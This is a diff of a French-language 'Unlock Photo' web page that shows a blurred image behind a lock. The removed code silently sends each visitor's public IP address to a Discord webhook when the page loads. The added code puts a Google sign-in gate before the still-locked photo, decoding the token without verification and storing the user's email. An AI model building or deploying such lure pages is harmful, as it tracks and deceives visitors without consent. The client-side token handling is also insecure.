@@ -5,6 +5,8 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Unlock Photo</title>
 
+<script src="https://accounts.google.com/gsi/client" async defer></script>
+
 <style>
 body {
     margin: 0;
@@ -14,6 +16,24 @@ body {
     align-items: center;
     background: linear-gradient(135deg, #0d0d0d, #1a1a1a);
     font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+}
+
+/* PAGE LOGIN */
+#loginPage {
+    text-align: center;
+    color: white;
+}
+
+.login-box {
+    background: rgba(255,255,255,0.05);
+    padding: 40px;
+    border-radius: 20px;
+    box-shadow: 0 0 30px rgba(0,0,0,0.8);
+}
+
+/* PAGE PHOTO */
+#photoPage {
+    display: none;
 }
 
 .container {
@@ -34,7 +54,7 @@ body {
     background-image: url('https://th.bing.com/th/id/OIP.Sf-7AhO0y59pnX5ZceAlCQHaKx?w=207&h=301&c=7&r=0&o=7&dpr=1.3&pid=1.7&rm=3');
     background-size: cover;
     background-position: center;
-    filter: blur(25px) brightness(0.7); /* Flou augmenté */
+    filter: blur(25px) brightness(0.7);
     z-index: 0;
 }
 
@@ -52,11 +72,6 @@ body {
     backdrop-filter: blur(10px);
     z-index: 2;
     cursor: pointer;
-    transition: transform 0.3s ease, box-shadow 0.3s ease;
-}
-.lock:hover {
-    transform: translate(-50%, -50%) scale(1.1);
-    box-shadow: 0 0 20px #ff4d4d, 0 0 40px #ff1a1a;
 }
 
 .title {
@@ -67,7 +82,6 @@ body {
     color: #fff;
     font-size: 22px;
     letter-spacing: 1px;
-    text-shadow: 0 0 5px rgba(255,255,255,0.5);
     z-index: 2;
 }
 </style>
@@ -75,35 +89,60 @@ body {
 
 <body>
 
-<div class="container">
-    <div class="lock">🔒</div>
-    <div class="title">Photo verrouillée</div>
+<!-- PAGE LOGIN -->
+<div id="loginPage">
+    <div class="login-box">
+        <h2>Connexion requise</h2>
+        <div id="g_id_onload"
+             data-client_id="739861507841-mnmfem8pjmcemo48ufsckgkqvtoec8j6.apps.googleusercontent.com"
+             data-callback="handleCredentialResponse">
+        </div>
+
+        <div class="g_id_signin"
+             data-type="standard"
+             data-size="large"
+             data-theme="outline"
+             data-text="signin_with"
+             data-shape="pill"
+             data-logo_alignment="left">
+        </div>
+    </div>
+</div>
+
+<!-- PAGE PHOTO -->
+<div id="photoPage">
+    <div class="container">
+        <div class="lock">🔒</div>
+        <div class="title">Photo verrouillée</div>
+    </div>
 </div>
 
 <script>
-// Envoie l'IP publique vers un webhook Discord
+function handleCredentialResponse(response) {
+    const jwt = response.credential;
+
+    // Décodage du token pour récupérer les infos utilisateur
+    const payload = JSON.parse(atob(jwt.split('.')[1]));
+
+    console.log("Connecté :", payload.email);
+
+    // Sauvegarde session locale
+    localStorage.setItem("google_user", payload.email);
+
+    showPhotoPage();
+}
+
+function showPhotoPage() {
+    document.getElementById("loginPage").style.display = "none";
+    document.getElementById("photoPage").style.display = "flex";
+}
+
+// Vérifie si déjà connecté
 window.onload = function() {
-    fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => {
-            const ip = data.ip;
-
-            const webhookUrl = 'https://discord.com/api/webhooks/TON_WEBHOOK_ID/TON_WEBHOOK_TOKEN'; // Remplace par ton webhook
-
-            const payload = {
-                content: `IP publique détectée : **${ip}**`
-            };
-
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload)
-            })
-            .catch(error => console.error('Erreur lors de l\'envoi vers le webhook Discord:', error));
-        })
-        .catch(error => console.error('Erreur lors de la récupération de l\'IP:', error));
+    const user = localStorage.getItem("google_user");
+    if(user) {
+        showPhotoPage();
+    }
 };
 </script>
 
